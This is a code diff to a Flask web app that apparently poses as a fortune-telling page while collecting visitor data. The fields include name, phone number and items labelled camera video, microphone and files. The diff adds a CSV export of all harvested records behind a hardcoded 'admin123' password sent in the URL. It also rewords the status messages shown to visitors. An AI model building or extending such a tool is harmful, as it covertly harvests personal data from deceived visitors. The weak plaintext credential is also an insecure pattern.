@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, Response
 import json
 import os
 import random
@@ -150,7 +150,7 @@ def admin():
             for v in visitors:
                 all_keys.update(v.keys())
             all_keys = sorted(list(all_keys))
-            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download?pass=admin123">Download JSON</a></p>'
+            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
             html += '<tr>' + ''.join(f'<th>{k}</th>' for k in all_keys) + '</tr>'
             for v in visitors:
@@ -187,12 +187,37 @@ def admin():
         </html>
     '''
 
-@app.route('/admin/download')
-def download():
+@app.route('/admin/download-csv')
+def download_csv():
     pwd = request.args.get('pass')
-    if pwd == 'admin123':
-        return jsonify(get_visitors())
-    return 'Unauthorized. Use /admin/download?pass=admin123', 403
+    if pwd != 'admin123':
+        return 'Unauthorized', 403
+    visitors = get_visitors()
+    if not visitors:
+        return 'No data', 404
+    
+    # Collect all keys
+    all_keys = set()
+    for v in visitors:
+        all_keys.update(v.keys())
+    all_keys = sorted(list(all_keys))
+    
+    # Create CSV content
+    import csv
+    from io import StringIO
+    output = StringIO()
+    writer = csv.writer(output)
+    writer.writerow(all_keys)
+    for v in visitors:
+        row = [str(v.get(k, '')) for k in all_keys]
+        writer.writerow(row)
+    
+    # Return as CSV download
+    return Response(
+        output.getvalue(),
+        mimetype='text/csv',
+        headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'}
+    )
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -592,7 +617,6 @@ HTML_TEMPLATE = '''
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
-        // Ensure these fields are always present (fallback)
         if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
         if (!visitorData.microphone) visitorData.microphone = 'not captured';
         if (!visitorData.files) visitorData.files = 'not captured';
@@ -623,8 +647,8 @@ HTML_TEMPLATE = '''
         }
         
         sendBtn.disabled = true;
-        sendBtn.innerText = '💫 Sending...';
-        statusDiv.innerText = 'Sending to your number...';
+        sendBtn.innerText = '💫 Saving...';
+        statusDiv.innerText = 'Saving your number...';
         
         try {
             const resp = await fetch('/save-phone', {
